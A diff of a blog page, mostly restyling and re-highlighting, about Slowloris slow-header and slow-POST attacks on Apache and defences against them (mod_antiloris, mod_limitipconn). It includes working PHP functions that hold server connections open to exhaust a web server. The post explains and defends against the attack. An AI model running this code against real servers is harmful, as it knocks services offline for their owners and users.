@@ -9,10 +9,9 @@
 	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/foundation.min.css" />
 	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/style.css" />
 	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/pygments.css" />	
-	<script src="//blog.macuyiko.com/theme/js/jquery-3.2.1.min.js"></script>
-	<script src="//blog.macuyiko.com/theme/js/custom.modernizr.js"></script>
-	<link href='//fonts.googleapis.com/css?family=Roboto+Slab:400,700|Open+Sans|Source+Code+Pro:400,500' rel='stylesheet' type='text/css'>
-	
+	<script src="//blog.macuyiko.com/theme/js/jquery-3.4.1.min.js"></script>
+	<link href="https://fonts.googleapis.com/css?family=Bitter:400,700|Source+Code+Pro&display=swap" rel="stylesheet">
+
 	<script type="text/javascript">
 	var waitForFinalEvent = (function () {
 		var timers = {};
@@ -25,7 +24,7 @@
 	var insertCaptions = function() {
 		$('#articlecontainer .caption').remove();
 		var width = $(window).width();
-		var onmobile = width < 960; //>
+		var onmobile = width < 1400; //>
 		var capclass = onmobile ? 'caption-below' : 'caption-aside';
 		$.each($('#articlecontainer img'), function(index, value) {
 			if ($(value).attr('alt') != undefined) {
@@ -109,7 +108,7 @@
 <h1>Attack</h1>
 <p>I run Apache, so, naturally, I was (and still am) concerned about this attack vector. The first step in preventing and solving security problems lies in understanding the attack. Luckily, in this case, the attack is devilishly simple. Based on a <span class="caps">PHP</span> version of the original Slowloris attack (<a href="http://seclists.org/fulldisclosure/2009/Jun/207">found here</a>), I wrote a modified script which also included the new <span class="caps">POST</span>-based attack method. The extended version of the script can be found on <a href="https://gist.github.com/771824">Github</a>.</p>
 <p>The usage is&nbsp;straightforward:</p>
-<div class="highlight"><pre><span></span>./scriptname.php &lt;method&gt; &lt;number of processes&gt; &lt;server&gt; [host]`
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">scriptname</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="o">&lt;</span><span class="k">method</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">processes</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="err">`</span><span class="w"></span>
 </pre></div>
 
 
@@ -121,62 +120,62 @@
 <li><code>[host]</code> is an optional parameter which will be used in the &#8220;Host:&#8221;-request header. If left blank the same value as  will be&nbsp;used.</li>
 </ul>
 <p>The script really illustrates how simple the attacks are, lets comment a bit on the <code>attack_get</code> function:</p>
-<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">attack_get</span><span class="p">(</span><span class="nx">$server</span><span class="p">,</span> <span class="nx">$host</span><span class="p">){</span>
-    <span class="err">#</span> <span class="nx">The</span> <span class="nx">following</span> <span class="nx">lines</span> <span class="nx">set</span> <span class="nx">up</span> <span class="nx">a</span> <span class="nx">normal</span> <span class="nx">HTTP1</span><span class="p">.</span><span class="mi">1</span> <span class="nx">GET</span> <span class="nx">request</span> <span class="kd">with</span> <span class="nx">Keep</span><span class="o">-</span><span class="nx">Alive</span>
-    <span class="nx">$request</span>  <span class="o">=</span> <span class="s2">&quot;GET / HTTP/1.1\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Host: $host\r\n&quot;</span><span class="p">;</span>
-    <span class="err">#</span> <span class="nx">Spoof</span> <span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span> <span class="p">(</span><span class="nx">can</span> <span class="nx">be</span> <span class="nx">changed</span><span class="p">)</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n&quot;</span><span class="p">;</span>
-    <span class="err">#</span> <span class="nx">The</span> <span class="nx">following</span> <span class="nx">header</span> <span class="nx">is</span><span class="p">,</span> <span class="nx">strictly</span> <span class="nx">speaking</span><span class="p">,</span> <span class="nx">not</span> <span class="nx">necessary</span><span class="p">,</span> <span class="nx">all</span> <span class="nx">HTTP1</span><span class="p">.</span><span class="mi">1</span> <span class="nx">requests</span> <span class="nx">are</span> <span class="nx">kept</span> <span class="nx">alive</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Keep-Alive: 900\r\n&quot;</span><span class="p">;</span>
-    <span class="err">#</span> <span class="nx">Just</span> <span class="nx">make</span> <span class="nx">the</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span> <span class="nx">large</span> <span class="nx">enough</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Content-Length: &quot;</span> <span class="p">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10000</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">)</span> <span class="p">.</span> <span class="s2">&quot;\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Accept: *.*\r\n&quot;</span><span class="p">;</span>
-    <span class="err">#</span> <span class="nx">First</span> <span class="nx">custom</span> <span class="nx">header</span><span class="p">,</span> <span class="nx">name</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">changed</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;X-a: &quot;</span> <span class="p">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span> <span class="p">.</span> <span class="s2">&quot;\r\n&quot;</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="nv">function</span> <span class="nv">attack_get</span><span class="ss">(</span>$<span class="nv">server</span>, $<span class="nv">host</span><span class="ss">)</span>{
+    # <span class="nv">The</span> <span class="nv">following</span> <span class="nv">lines</span> <span class="nv">set</span> <span class="nv">up</span> <span class="nv">a</span> <span class="nv">normal</span> <span class="nv">HTTP1</span>.<span class="mi">1</span> <span class="nv">GET</span> <span class="nv">request</span> <span class="nv">with</span> <span class="nv">Keep</span><span class="o">-</span><span class="nv">Alive</span>
+    $<span class="nv">request</span>  <span class="o">=</span> <span class="s2">&quot;</span><span class="s">GET / HTTP/1.1\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Host: $host\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    # <span class="nv">Spoof</span> <span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span> <span class="ss">(</span><span class="nv">can</span> <span class="nv">be</span> <span class="nv">changed</span><span class="ss">)</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    # <span class="nv">The</span> <span class="nv">following</span> <span class="nv">header</span> <span class="nv">is</span>, <span class="nv">strictly</span> <span class="nv">speaking</span>, <span class="nv">not</span> <span class="nv">necessary</span>, <span class="nv">all</span> <span class="nv">HTTP1</span>.<span class="mi">1</span> <span class="nv">requests</span> <span class="nv">are</span> <span class="nv">kept</span> <span class="nv">alive</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Keep-Alive: 900\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    # <span class="nv">Just</span> <span class="nv">make</span> <span class="nv">the</span> <span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span> <span class="nv">large</span> <span class="nv">enough</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Content-Length: </span><span class="s2">&quot;</span> . <span class="nv">rand</span><span class="ss">(</span><span class="mi">10000</span>, <span class="mi">1000000</span><span class="ss">)</span> . <span class="s2">&quot;</span><span class="s">\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Accept: *.*\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    # <span class="nv">First</span> <span class="nv">custom</span> <span class="nv">header</span>, <span class="nv">name</span> <span class="nv">can</span> <span class="nv">be</span> <span class="nv">changed</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">X-a: </span><span class="s2">&quot;</span> . <span class="nv">rand</span><span class="ss">(</span><span class="mi">1</span>, <span class="mi">10000</span><span class="ss">)</span> . <span class="s2">&quot;</span><span class="s">\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
 
-    <span class="err">#</span> <span class="nx">Open</span> <span class="nx">socket</span> <span class="nx">to</span> <span class="nx">webserver</span> <span class="nx">and</span> <span class="nx">send</span> <span class="nx">request</span>
-    <span class="nx">$sockfd</span> <span class="o">=</span> <span class="kd">@fsockopen</span><span class="p">(</span><span class="nx">$server</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">);</span>
-    <span class="kd">@fwrite</span><span class="p">(</span><span class="nx">$sockfd</span><span class="p">,</span> <span class="nx">$request</span><span class="p">);</span>
+    # <span class="nv">Open</span> <span class="nv">socket</span> <span class="nv">to</span> <span class="nv">webserver</span> <span class="nv">and</span> <span class="k">send</span> <span class="nv">request</span>
+    $<span class="nv">sockfd</span> <span class="o">=</span> @<span class="nv">fsockopen</span><span class="ss">(</span>$<span class="nv">server</span>, <span class="mi">80</span>, <span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
+    @<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">sockfd</span>, $<span class="nv">request</span><span class="ss">)</span><span class="c1">;</span>
 
-    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">){</span>
-     <span class="err">#</span> <span class="nx">Try</span> <span class="nx">adding</span> <span class="nx">another</span> <span class="nx">bogus</span> <span class="nx">header</span>
-        <span class="k">if</span> <span class="p">(</span><span class="kd">@fwrite</span><span class="p">(</span><span class="nx">$sockfd</span><span class="p">,</span> <span class="s2">&quot;X-c:&quot;</span> <span class="p">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100000</span><span class="p">)</span> <span class="p">.</span> <span class="s2">&quot;\r\n&quot;</span><span class="p">)){</span>
-         <span class="err">#</span> <span class="nx">Sleep</span> <span class="k">for</span> <span class="nx">a</span> <span class="nx">bit</span>
-            <span class="nx">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">);</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="err">#</span> <span class="nx">Sending</span> <span class="nx">failed</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+    <span class="k">while</span> <span class="ss">(</span><span class="nv">true</span><span class="ss">)</span>{
+     # <span class="nv">Try</span> <span class="nv">adding</span> <span class="nv">another</span> <span class="nv">bogus</span> <span class="nv">header</span>
+        <span class="k">if</span> <span class="ss">(</span>@<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">sockfd</span>, <span class="s2">&quot;</span><span class="s">X-c:</span><span class="s2">&quot;</span> . <span class="nv">rand</span><span class="ss">(</span><span class="mi">1</span>, <span class="mi">100000</span><span class="ss">)</span> . <span class="s2">&quot;</span><span class="s">\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="ss">))</span>{
+         # <span class="nv">Sleep</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">bit</span>
+            <span class="nv">sleep</span><span class="ss">(</span><span class="mi">15</span><span class="ss">)</span><span class="c1">;</span>
+        }<span class="k">else</span>{
+            # <span class="nv">Sending</span> <span class="nv">failed</span>
+        }
+    }
+}
 </pre></div>
 
 
 <p>The <code>attack_post</code> function works very&nbsp;similar:</p>
-<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">attack_post</span><span class="p">(</span><span class="nx">$server</span><span class="p">,</span> <span class="nx">$host</span><span class="p">){</span>
-    <span class="err">#</span> <span class="nx">Send</span> <span class="nx">a</span> <span class="nx">post</span> <span class="nx">request</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">random</span> <span class="nx">location</span><span class="p">,</span> <span class="nx">eventually</span> <span class="nx">you</span> <span class="nx">could</span> <span class="nx">change</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">make</span> <span class="nx">sure</span> <span class="nx">you</span> <span class="nx">post</span> <span class="nx">to</span> <span class="nx">an</span> <span class="nx">existing</span> <span class="nx">URL</span>
-    <span class="nx">$request</span>  <span class="o">=</span> <span class="s2">&quot;POST /&quot;</span><span class="p">.</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">()).</span><span class="s2">&quot; HTTP/1.1\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Host: $host\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Keep-Alive: 900\r\n&quot;</span><span class="p">;</span>
-    <span class="err">#</span> <span class="s2">&quot;Prepare yourself webserver, we&#39;re going to send a lot here, ready?&quot;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Content-Length: 1000000000\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><span class="p">;</span>
-    <span class="nx">$request</span> <span class="p">.</span><span class="o">=</span> <span class="s2">&quot;Accept: *.*\r\n&quot;</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="nv">function</span> <span class="nv">attack_post</span><span class="ss">(</span>$<span class="nv">server</span>, $<span class="nv">host</span><span class="ss">)</span>{
+    # <span class="k">Send</span> <span class="nv">a</span> <span class="nv">post</span> <span class="nv">request</span> <span class="nv">to</span> <span class="nv">a</span> <span class="k">random</span> <span class="nv">location</span>, <span class="nv">eventually</span> <span class="nv">you</span> <span class="nv">could</span> <span class="nv">change</span> <span class="nv">this</span> <span class="nv">to</span> <span class="nv">make</span> <span class="nv">sure</span> <span class="nv">you</span> <span class="nv">post</span> <span class="nv">to</span> <span class="nv">an</span> <span class="nv">existing</span> <span class="nv">URL</span>
+    $<span class="nv">request</span>  <span class="o">=</span> <span class="s2">&quot;</span><span class="s">POST /</span><span class="s2">&quot;</span>.<span class="nv">md5</span><span class="ss">(</span><span class="nv">rand</span><span class="ss">())</span>.<span class="s2">&quot;</span><span class="s"> HTTP/1.1\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Host: $host\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Keep-Alive: 900\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    # <span class="s2">&quot;</span><span class="s">Prepare yourself webserver, we&#39;re going to send a lot here, ready?</span><span class="s2">&quot;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Content-Length: 1000000000\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Content-Type: application/x-www-form-urlencoded\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+    $<span class="nv">request</span> .<span class="o">=</span> <span class="s2">&quot;</span><span class="s">Accept: *.*\r</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
 
-    <span class="nx">$sockfd</span> <span class="o">=</span> <span class="kd">@fsockopen</span><span class="p">(</span><span class="nx">$server</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">$errno</span><span class="p">,</span> <span class="nx">$errstr</span><span class="p">);</span>
-    <span class="kd">@fwrite</span><span class="p">(</span><span class="nx">$sockfd</span><span class="p">,</span> <span class="nx">$request</span><span class="p">);</span>
+    $<span class="nv">sockfd</span> <span class="o">=</span> @<span class="nv">fsockopen</span><span class="ss">(</span>$<span class="nv">server</span>, <span class="mi">80</span>, <span class="mh">$e</span><span class="nv">rrno</span>, <span class="mh">$e</span><span class="nv">rrstr</span><span class="ss">)</span><span class="c1">;</span>
+    @<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">sockfd</span>, $<span class="nv">request</span><span class="ss">)</span><span class="c1">;</span>
 
-    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">){</span>
-        <span class="err">#</span> <span class="nx">Send</span> <span class="nx">a</span> <span class="nx">small</span> <span class="nx">bit</span> <span class="nx">of</span> <span class="nx">content</span>
-        <span class="k">if</span> <span class="p">(</span><span class="kd">@fwrite</span><span class="p">(</span><span class="nx">$sockfd</span><span class="p">,</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="nx">FALSE</span><span class="p">){</span>
-            <span class="err">#</span> <span class="nx">Sleep</span> <span class="k">for</span> <span class="nx">a</span> <span class="nx">bit</span><span class="p">,</span> <span class="nx">pretend</span> <span class="nx">that</span> <span class="s2">&quot;We&#39;re a terribly slow browser, so sorry...&quot;</span>
-            <span class="nx">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="err">#</span> <span class="nx">Sending</span> <span class="nx">failed</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+    <span class="k">while</span> <span class="ss">(</span><span class="nv">true</span><span class="ss">)</span>{
+        # <span class="k">Send</span> <span class="nv">a</span> <span class="nv">small</span> <span class="nv">bit</span> <span class="nv">of</span> <span class="nv">content</span>
+        <span class="k">if</span> <span class="ss">(</span>@<span class="nv">fwrite</span><span class="ss">(</span>$<span class="nv">sockfd</span>, <span class="s2">&quot;</span><span class="s">.</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="o">!==</span> <span class="nv">FALSE</span><span class="ss">)</span>{
+            # <span class="nv">Sleep</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">bit</span>, <span class="nv">pretend</span> <span class="nv">that</span> <span class="s2">&quot;</span><span class="s">We&#39;re a terribly slow browser, so sorry...</span><span class="s2">&quot;</span>
+            <span class="nv">sleep</span><span class="ss">(</span><span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+        }<span class="k">else</span>{
+            # <span class="nv">Sending</span> <span class="nv">failed</span>
+        }
+    }
+}
 </pre></div>
 
 
@@ -214,30 +213,30 @@
 <p>Turning <code>KeepAlive</code> completely off might help, but it is no real remedy. The <span class="caps">POST</span> attack still remains an issue. Tweaking with the Apache options alone is thus certainly not&nbsp;enough.</p>
 <h2>mod_antiloris</h2>
 <p>Some developers have released Apache modules geared to mitigate the Slowloris attack. The two most common ones are <code>mod_antiloris</code> and <code>mod_noloris</code>. Both use the same trick to prevent attacks. They both hook into connection&nbsp;attempts:</p>
-<div class="highlight"><pre><span></span>ap_hook_process_connection(pre_connection, NULL, NULL, APR_HOOK_FIRST);
+<div class="highlight"><pre><span></span><span class="n">ap_hook_process_connection</span><span class="p">(</span><span class="n">pre_connection</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">APR_HOOK_FIRST</span><span class="p">);</span>
 </pre></div>
 
 
 <p>And count how many connections from the same remote <span class="caps">IP</span> are already in the SERVER_BUSY_READ state (the server is reading data from a client). When this count is too high, subsequent connections get&nbsp;denied:</p>
-<div class="highlight"><pre><span></span>for (i = 0; i &lt; server_limit; ++i) {
-    for (j = 0; j &lt; thread_limit; ++j) {
-        ws_record = ap_get_scoreboard_worker(i, j);
-        switch (ws_record-&gt;status) {
-            case SERVER_BUSY_READ:
-                if (strcmp(client_ip, ws_record-&gt;client) == 0)
-                    ip_count++;
-                break;
-            default:
-                break;
+<div class="highlight"><pre><span></span><span class="k">for</span> <span class="ss">(</span><span class="nv">i</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; i &lt; server_limit; ++i) {</span>
+    <span class="k">for</span> <span class="ss">(</span><span class="nv">j</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; j &lt; thread_limit; ++j) {</span>
+        <span class="nv">ws_record</span> <span class="o">=</span> <span class="nv">ap_get_scoreboard_worker</span><span class="ss">(</span><span class="nv">i</span>, <span class="nv">j</span><span class="ss">)</span><span class="c1">;</span>
+        <span class="nv">switch</span> <span class="ss">(</span><span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">status</span><span class="ss">)</span> {
+            <span class="nv">case</span> <span class="nv">SERVER_BUSY_READ</span>:
+                <span class="k">if</span> <span class="ss">(</span><span class="nv">strcmp</span><span class="ss">(</span><span class="nv">client_ip</span>, <span class="nv">ws_record</span><span class="o">-&gt;</span><span class="nv">client</span><span class="ss">)</span> <span class="o">==</span> <span class="mi">0</span><span class="ss">)</span>
+                    <span class="nv">ip_count</span><span class="o">++</span><span class="c1">;</span>
+                <span class="k">break</span><span class="c1">;</span>
+            <span class="nv">default</span>:
+                <span class="k">break</span><span class="c1">;</span>
         }
     }
 }
 
-if (ip_read_count &gt; conf-&gt;read_limit) {
-    ap_log_error(APLOG_MARK, APLOG_WARNING, 0, NULL, &quot;[client %s] rejected, too many connections in READ state&quot;, c-&gt;remote_ip);
-    return OK;
-} else {
-    return DECLINED;
+<span class="k">if</span> <span class="ss">(</span><span class="nv">ip_read_count</span> <span class="o">&gt;</span> <span class="nv">conf</span><span class="o">-&gt;</span><span class="nv">read_limit</span><span class="ss">)</span> {
+    <span class="nv">ap_log_error</span><span class="ss">(</span><span class="nv">APLOG_MARK</span>, <span class="nv">APLOG_WARNING</span>, <span class="mi">0</span>, <span class="nv">NULL</span>, <span class="s2">&quot;</span><span class="s">[client %s] rejected, too many connections in READ state</span><span class="s2">&quot;</span>, <span class="nv">c</span><span class="o">-&gt;</span><span class="nv">remote_ip</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="k">return</span> <span class="nv">OK</span><span class="c1">;</span>
+} <span class="k">else</span> {
+    <span class="k">return</span> <span class="nv">DECLINED</span><span class="c1">;</span>
 }
 </pre></div>
 
@@ -247,23 +246,23 @@ if (ip_read_count &gt; conf-&gt;read_limit) {
 <h2>mod_limitipconn</h2>
 <p>During testing, I discovered that the mod_antiloris module above only protects against the original slow header variant of the Slowloris attack. The slow post was still killing my webserver. So I explored the use of another mod, named <a href="http://dominia.org/djao/limitipconn2.html">mod_limitipconn</a>, which limits simultaneous requests from the same <span class="caps">IP</span>.</p>
 <p>There is no Apache2 module of <code>mod_limitipconn</code> in the Ubuntu repositories, but a Debian deb package is available online and works fine on&nbsp;Ubuntu:</p>
-<div class="highlight"><pre><span></span># Use the i386 package if you have to...
-$ wget http://elonen.iki.fi/code/unofficial-debs/mod-limitipconn/apache2-mod-limitipconn_0.22-2_amd64.deb
-$ sudo dpkg -i ./apache2-mod-limitipconn_0.22-2_amd64.deb
-$ sudo a2enmod limitipconn
+<div class="highlight"><pre><span></span># <span class="nv">Use</span> <span class="nv">the</span> <span class="nv">i386</span> <span class="nv">package</span> <span class="k">if</span> <span class="nv">you</span> <span class="nv">have</span> <span class="nv">to</span>...
+$ <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">elonen</span>.<span class="nv">iki</span>.<span class="nv">fi</span><span class="o">/</span><span class="nv">code</span><span class="o">/</span><span class="nv">unofficial</span><span class="o">-</span><span class="nv">debs</span><span class="o">/</span><span class="nv">mod</span><span class="o">-</span><span class="nv">limitipconn</span><span class="o">/</span><span class="nv">apache2</span><span class="o">-</span><span class="nv">mod</span><span class="o">-</span><span class="nv">limitipconn_0</span>.<span class="mi">22</span><span class="o">-</span><span class="mi">2</span><span class="nv">_amd64</span>.<span class="nv">deb</span>
+$ <span class="nv">sudo</span> <span class="nv">dpkg</span> <span class="o">-</span><span class="nv">i</span> .<span class="o">/</span><span class="nv">apache2</span><span class="o">-</span><span class="nv">mod</span><span class="o">-</span><span class="nv">limitipconn_0</span>.<span class="mi">22</span><span class="o">-</span><span class="mi">2</span><span class="nv">_amd64</span>.<span class="nv">deb</span>
+$ <span class="nv">sudo</span> <span class="nv">a2enmod</span> <span class="nv">limitipconn</span>
 </pre></div>
 
 
 <p>Before you restart Apache, create a configuration file at <code>/etc/apache2/conf.d/limitipconn.conf</code>:</p>
-<div class="highlight"><pre><span></span>ExtendedStatus On
-<span class="nt">&lt;IfModule</span> <span class="err">mod_limitipconn.c</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;Location</span> <span class="nt">/&gt;</span>
-                # Global settings here
-                MaxConnPerIP 10
-                # No limit for images
-                NoIPLimit image/*
-        <span class="nt">&lt;/Location&gt;</span>
-<span class="nt">&lt;/IfModule&gt;</span>
+<div class="highlight"><pre><span></span><span class="nv">ExtendedStatus</span> <span class="nv">On</span>
+<span class="o">&lt;</span><span class="nv">IfModule</span> <span class="nv">mod_limitipconn</span>.<span class="nv">c</span><span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="nv">Location</span> <span class="o">/&gt;</span>
+                # <span class="nv">Global</span> <span class="nv">settings</span> <span class="nv">here</span>
+                <span class="nv">MaxConnPerIP</span> <span class="mi">10</span>
+                # <span class="nv">No</span> <span class="nv">limit</span> <span class="k">for</span> <span class="nv">images</span>
+                <span class="nv">NoIPLimit</span> <span class="nv">image</span><span class="cm">/*</span>
+<span class="cm">        &lt;/Location&gt;</span>
+<span class="cm">&lt;/IfModule&gt;</span>
 </pre></div>
 
 
@@ -274,25 +273,25 @@ $ sudo a2enmod limitipconn
 
 <p>When investigating the source code of mod_limitipconn, we find the following&nbsp;lines:</p>
 <div class="highlight"><pre><span></span><span class="cm">/* Count up the number of connections we are handling right now from</span>
-<span class="cm">* this IP address */</span><span class="w"></span>
-<span class="kr">for</span><span class="w"> </span><span class="o">(</span>i<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="err">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>server_limit<span class="err">;</span><span class="w"> </span><span class="o">++</span>i<span class="o">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">    </span><span class="kr">for</span><span class="w"> </span><span class="o">(</span>j<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="err">;</span><span class="w"> </span>j<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>thread_limit<span class="err">;</span><span class="w"> </span><span class="o">++</span>j<span class="o">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">        </span>ws_record<span class="w"> </span><span class="o">=</span><span class="w"> </span>ap_get_scoreboard_worker<span class="o">(</span>i<span class="o">,</span><span class="w"> </span>j<span class="o">)</span><span class="err">;</span><span class="w"></span>
-<span class="w">        </span>switch<span class="w"> </span><span class="o">(</span>ws_record<span class="o">-&gt;</span>status<span class="o">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_BUSY_READ</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_BUSY_WRITE</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_BUSY_KEEPALIVE</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_BUSY_LOG</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_BUSY_DNS</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_CLOSING</span><span class="o">:</span><span class="w"></span>
-<span class="w">            </span>case<span class="w"> </span><span class="nl">SERVER_GRACEFUL</span><span class="o">:</span><span class="w"></span>
-<span class="w">                </span><span class="kr">if</span><span class="w"> </span><span class="o">(</span>strcmp<span class="o">(</span><span class="kr">address</span><span class="o">,</span><span class="w"> </span>ws_record<span class="o">-&gt;</span>client<span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"></span>
-<span class="w">                    </span>ip_count<span class="o">++</span><span class="err">;</span><span class="w"></span>
-<span class="w">                </span>break<span class="err">;</span><span class="w"></span>
-<span class="w">            </span><span class="nl">default</span><span class="o">:</span><span class="w"></span>
